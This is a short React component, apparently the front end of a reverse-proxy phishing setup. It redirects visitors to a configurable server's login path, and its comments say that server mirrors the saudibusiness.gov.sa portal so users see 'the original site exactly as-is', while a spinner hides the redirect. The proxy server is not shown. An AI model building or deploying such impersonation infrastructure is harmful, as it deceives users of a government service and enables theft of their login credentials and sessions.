import { useEffect } from "react";

const SERVER_URL = import.meta.env.VITE_SOCKET_URL || "http://localhost:3001";

export default function SaudiBusinessProxy() {
  useEffect(() => {
    // Redirect to the server which serves saudibusiness.gov.sa at root
    // The user sees the original site exactly as-is
    window.location.href = `${SERVER_URL}/Identity/Account/Login`;
  }, []);

  return (
    <div style={{
      width: "100vw",
      height: "100vh",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      background: "#f8f9fa",
      direction: "rtl",
      fontFamily: "Tajawal, sans-serif",
    }}>
      <div style={{ textAlign: "center" }}>
        <div style={{
          width: 48,
          height: 48,
          border: "4px solid #e5e7eb",
          borderTop: "4px solid #059669",
          borderRadius: "50%",
          animation: "spin 0.8s linear infinite",
          margin: "0 auto 16px",
        }} />
        <p style={{ color: "#6b7280", fontSize: 16 }}>جاري التحميل...</p>
        <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
      </div>
    </div>
  );
}
